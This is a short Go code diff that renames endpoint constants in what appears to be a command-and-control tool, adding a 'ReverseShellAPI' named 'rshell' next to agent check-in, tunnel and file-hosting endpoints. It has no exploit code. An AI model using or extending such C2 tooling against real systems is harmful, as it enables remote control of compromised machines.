@@ -4,11 +4,11 @@ const (
 	// CheckInAPI agent send POST to this API to report its system info
 	CheckInAPI = "checkin"
 
-	// TunAPI duplex tunnel between agent and cc
-	TunAPI = "tun"
+	// MsgAPI duplex tunnel between agent and cc
+	MsgAPI = "msg"
 
-	// StreamAPI duplex tunnel between agent and cc
-	StreamAPI = "stream"
+	// ReverseShellAPI duplex tunnel between agent and cc
+	ReverseShellAPI = "rshell"
 
 	// FileAPI host some files
 	FileAPI = "www/"
